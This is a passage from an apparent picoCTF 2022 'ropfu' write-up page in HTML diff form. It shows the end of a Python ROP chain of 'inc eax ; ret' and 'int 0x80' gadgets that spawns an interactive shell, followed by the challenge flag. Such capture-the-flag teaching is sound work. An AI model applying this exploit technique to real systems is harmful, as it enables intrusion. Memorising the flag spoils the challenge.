+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0808055e</span>) <span style="color:#75715e"># inc eax ; ret</span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">+=</span> pack(<span style="color:#e6db74">&#39;&lt;I&#39;</span>, <span style="color:#ae81ff">0x0804a3d2</span>) <span style="color:#75715e"># int 0x80</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>sendline(p)
+</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img src="/img/picoctf2022-binexp/ropfu.png" alt="IMG"></p>
 <p>Flag:</p>
 <pre tabindex="0"><code>picoCTF{5n47ch_7h3_5h311_e81af635}
 </code></pre><p>Thank you so much for reading till here, have a great day ahead !</p>
